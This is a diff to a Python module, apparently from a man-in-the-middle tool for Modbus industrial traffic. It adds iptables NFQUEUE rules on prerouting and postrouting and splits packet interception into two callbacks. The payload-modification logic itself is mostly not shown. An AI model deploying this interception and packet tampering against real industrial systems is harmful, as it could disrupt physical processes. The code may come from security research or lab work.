@@ -2,7 +2,7 @@
 NFQ module. Callbacks and persistent object
 '''
 
-from scapy.all import IP, TCP, Packet
+from scapy.all import IP, TCP, Packet, Ether, IPv6
 from scapy.contrib.modbus import ModbusADURequest, ModbusADUResponse
 import threading, os, select, subprocess
 from .nmap import NMapper
@@ -102,22 +102,29 @@ class NetFilterQueue:
 
         # IPTables rule
         
-        cmd = [
-            "sudo",
-            "iptables",
-            "-t", "mangle",
-            "-A", "PREROUTING",
-            "-i", active_iface,
-            # "-p", "tcp",
-            "-j", "NFQUEUE",
-            "--queue-num", "1",
+        rules = [
+            [
+                "sudo", "iptables",
+                "-t", "mangle",
+                "-A", "PREROUTING",
+                "-i", active_iface,
+                "-j", "NFQUEUE",
+                "--queue-num", "1",
+            ],
+            [
+                "sudo", "iptables",
+                "-t", "mangle",
+                "-A", "POSTROUTING",
+                "-o", active_iface,
+                "-j", "NFQUEUE",
+                "--queue-num", "2",
+            ]
         ]
 
-        result = subprocess.run(cmd, capture_output=True, text=True)
-
-        print("stdout:", result.stdout)
-        print("stderr:", result.stderr)
-        print("returncode:", result.returncode)
+        for cmd in rules:
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            print(result.stdout)
+            print(result.stderr)
         
         self.buffer.put("mitm", f"Adding iptables rule:")
         self.buffer.put("mitm", f"sudo iptables -t mangle -A PREROUTING -i {active_iface} -p TCP -j NFQUEUE --queue-num 1")
@@ -130,14 +137,19 @@ class NetFilterQueue:
         # -j NFQUEUE	Instead of normal processing, send packets to an NFQUEUE
         # --queue-num 1	Send them to queue number 1
 
-        # Create and bind NFQ callback
-        nfq = NFQ()
-        nfq.bind(1, self.callback)
+        nfq_in = NFQ()
+        nfq_out = NFQ()
+
+        nfq_in.bind(1, self.prerouting_callback)
+        nfq_out.bind(2, self.postrouting_callback)
 
         # Get readable file descriptor
-        qfd = nfq.get_fd()
+        qfd_in = nfq_in.get_fd()
+        qfd_out = nfq_out.get_fd()
+
         poller = select.poll()
-        poller.register(qfd, select.POLLIN)
+        poller.register(qfd_in, select.POLLIN)
+        poller.register(qfd_out, select.POLLIN)
 
         # Pipe for stop signaling
         stop_r, stop_w = os.pipe()
@@ -146,32 +158,44 @@ class NetFilterQueue:
         try:
             while not self.stop_event.is_set():
                 events = poller.poll(500)
+
                 for fd, _ in events:
-                    if fd == qfd:
-                        nfq.run(False)   # process packets without blocking
+                    if fd == qfd_in:
+                        nfq_in.run(False)
+
+                    elif fd == qfd_out:
+                        nfq_out.run(False)
+
                     elif fd == stop_r:
                         self.stop_event.set()
-        # Stop on error or stop event
+                    # Stop on error or stop event
         finally:
-            nfq.unbind()
+            nfq_in.unbind()
+            nfq_out.unbind()
             os.close(stop_r)
             os.close(stop_w)
-            cmd = [
-                "sudo",
-                "iptables",
-                "-t", "mangle",
-                "-D", "PREROUTING",
-                "-i", active_iface,
-                # "-p", "tcp",
-                "-j", "NFQUEUE",
-                "--queue-num", "1",
+
+            rules = [
+                [
+                    "sudo", "iptables",
+                    "-t", "mangle",
+                    "-D", "PREROUTING",
+                    "-i", active_iface,
+                    "-j", "NFQUEUE",
+                    "--queue-num", "1",
+                ],
+                [
+                    "sudo", "iptables",
+                    "-t", "mangle",
+                    "-D", "POSTROUTING",
+                    "-o", active_iface,
+                    "-j", "NFQUEUE",
+                    "--queue-num", "2",
+                ]
             ]
 
-            result = subprocess.run(cmd, capture_output=True, text=True)
-
-            print("stdout:", result.stdout)
-            print("stderr:", result.stderr)
-            print("returncode:", result.returncode)
+            for cmd in rules:
+                subprocess.run(cmd, capture_output=True, text=True)
             self.buffer.put("mitm", "Stopped net filter queue")
 
 
@@ -188,13 +212,56 @@ class NetFilterQueue:
             self.buffer.put("mitm", "Stopped MITM attack")
 
 
-    # Callbacks
+    # Callback 
+    def prerouting_callback(self, pkt):
+        spkt = self.get_spkt(pkt)
+
+        self.buffer.put("mitm", "PREROUTING NFQ unmodded", spkt)
+        # TODO add logic and timeline flags if it really does get modded
+        spkt, modified = self.modify_spkt(spkt)
+        if modified:
+            self.buffer.put("mitm", "PREROUTING NFQ modified", spkt)
+            pkt.set_payload(bytes(spkt))
+
+        pkt.accept()
+
+
+    def postrouting_callback(self, pkt):
+        spkt = self.get_spkt(pkt)
+
+        self.buffer.put("mitm", "POSTROUTING NFQ", spkt)
+
+        pkt.accept()
+
+    def get_spkt(self, pkt):
+        spkt = None
+        raw = pkt.get_payload()
+
+        # IPv4
+        if raw[0] >> 4 == 4:
+            return IP(raw)
+
+        # IPv6
+        if raw[0] >> 4 == 6:
+            return IPv6(raw)
+
+        # Ethernet?
+        if len(raw) >= 14:
+            ethertype = int.from_bytes(raw[12:14], "big")
+
+            if ethertype == 0x0800:
+                return Ether(raw)
+            elif ethertype == 0x0806:
+                return Ether(raw)
+            elif ethertype == 0x86DD:
+                return Ether(raw)
+        return spkt
 
     def nfq_callback(self, pkt: Packet):
         spkt = IP(pkt.get_payload())
         self.buffer.put("mitm", "incoming mitm packet", spkt)
         
-        spkt = self.modify_spkt(spkt)
+        spkt, modified = self.modify_spkt(spkt)
 
         self.buffer.put("mitm", "outgoing mitm packet", spkt)
 
@@ -267,4 +334,4 @@ class NetFilterQueue:
             del spkt[IP].chksum
 
             spkt = IP(bytes(spkt))
-        return spkt
+        return spkt, modified_flag
